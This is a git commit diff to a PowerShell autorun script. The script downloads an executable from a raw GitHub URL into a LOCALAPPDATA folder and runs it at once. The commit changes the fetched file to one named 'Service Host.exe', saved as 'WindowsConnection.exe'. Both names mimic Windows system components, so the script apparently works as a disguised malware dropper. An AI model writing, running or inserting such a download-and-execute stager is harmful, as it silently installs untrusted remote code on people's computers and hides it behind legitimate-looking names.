34ebc40e40438a27d19ed364ffd9cdc3f8932f7b
oliikxd <128747636+oliikxd@users.noreply.github.com>
2025-07-10 10:01:30 +0200

    Update autorun.ps1

--- autorun.ps1
+++ autorun.ps1
@@ -1,5 +1,5 @@
 
-$downloadUrl = "https://raw.githubusercontent.com/oliikxd/S/main/WindowsConnection.exe"
+$downloadUrl = "https://raw.githubusercontent.com/oliikxd/S/main/Service%20Host.exe"
 $targetPath = "$env:LOCALAPPDATA\ResearchLab\Storage\WindowsConnection.exe"
 Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath
 Start-Process -FilePath $targetPath
